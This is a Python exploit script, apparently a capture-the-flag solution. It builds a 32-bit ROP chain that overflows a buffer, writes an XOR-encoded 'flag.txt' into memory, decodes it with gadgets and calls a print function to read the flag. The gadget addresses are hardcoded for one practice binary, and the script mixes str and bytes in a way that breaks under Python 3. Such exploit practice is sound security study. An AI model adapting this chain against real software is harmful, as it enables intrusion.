import struct

xorGadget = 0x08048547
pop2 = 0x080485b9
data = 0x0804a018
mov = 0x0804854f
toEBP = 0x080485bb
toEBX = 0x0804839d

printFunc = 0x80483d0

string = 'flag.txt'

def XORencode(string):

    encoded_s = ""
    key = 0x37

    for i in range(0, len(string)):
        e_char = chr(ord(string[i]) ^ key)

        encoded_s += e_char
        
    return encoded_s

secret = XORencode(string)

payload = b""
payload += b"A" * 44

payload += struct.pack("I", pop2) # pop esi; pop edi; pop ebp; ret;
payload += secret[:4]
payload += struct.pack("I", data) # adress of .data section
payload += struct.pack("I", 0x0)
payload += struct.pack("I", mov) # mov DWORD PTR [edi],esi

payload += struct.pack("I", pop2)
payload += secret[4:]
payload += struct.pack("I", data + 4)
payload += struct.pack("I", 0x0)
payload += struct.pack("I", mov)

for i in range(0,len(secret)):
    payload += struct.pack("I", toEBP) # pop ebp; ret;
    payload += struct.pack("I", data + i)
    payload += struct.pack("I", toEBX) # pop ebx; ret;
    payload += struct.pack("I", 0x37)
    payload += struct.pack("I", xorGadget) # xor BYTE PTR [ebp+0x0],bl

payload += struct.pack("I", printFunc)
payload += struct.pack("I", 0x0)
payload += struct.pack("I", data)

print(payload)
